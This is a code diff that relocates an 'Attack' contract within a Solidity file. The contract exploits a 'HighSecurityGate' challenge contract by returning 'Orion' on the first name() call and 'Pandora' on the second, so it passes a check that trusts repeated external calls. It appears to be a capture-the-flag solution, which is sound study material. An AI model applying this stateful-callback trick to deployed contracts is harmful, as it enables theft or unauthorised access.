@@ -1,22 +1,5 @@
 pragma solidity ^0.8.18;
 
-contract Attack is Entrant {
-    bool public repeat;
-
-    function exploit(HighSecurityGate hsg) external {
-        repeat = false;
-        hsg.enter();
-    }
-
-    function name() external returns (string memory) {
-        if (!repeat){
-            repeat = true;
-            return "Orion";
-        }
-        return "Pandora";
-    }
-}
-
 interface Entrant {
     function name() external returns (string memory);
 }
@@ -46,3 +29,22 @@ contract HighSecurityGate {
         return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2)); 
     }
 }
+
+contract Attack is Entrant {
+    bool public repeat;
+
+    function exploit(HighSecurityGate hsg) external {
+        repeat = false;
+        hsg.enter();
+    }
+
+    function name() external returns (string memory) {
+        if (!repeat){
+            repeat = true;
+            return "Orion";
+        }
+        return "Pandora";
+    }
+}
+
+
